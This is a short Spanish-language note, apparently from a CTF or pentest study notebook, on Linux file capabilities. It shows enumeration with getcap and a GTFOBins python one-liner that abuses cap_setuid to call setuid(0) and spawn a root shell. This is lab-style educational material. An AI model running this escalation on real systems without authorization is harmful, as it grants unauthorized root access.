Las capabilities en Linux otorgan permisos especiales a binarios sin necesidad de ser root.  
Con `getcap /ruta/al/binario` podés verlas.  
La vulnerable es `cap_setuid+ep` (EIP), que permite escalar privilegios a root.

---

# Explicacion de comando y parametros

```
getcap -r / 2>/dev/null
```
*Parametros:*
`-r` Busca de forma recursiva en los directorios
`/` Busca desde la raiz del sistema
`2>/dev/null` Es para que no nos aparezca en nuestro output los errores y los rediriga todos a la carpeta /dev/null

-------
# Enumeracion y explotacion

Usamos el comando `getcap -r / 2>/dev/null` y vemos que tiene una capability en python

![[Cap14.png]]

Vamos a vamos a [gtfobinds](https://gtfobins.github.io/gtfobins/python/#capabilities), nos da este oneliner
![[Cap13.png]]
Lo adaptamos a nuestra maquina, lo ejecutamos y podemos visualizar las flags ``python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'``

![[Cap15.png]]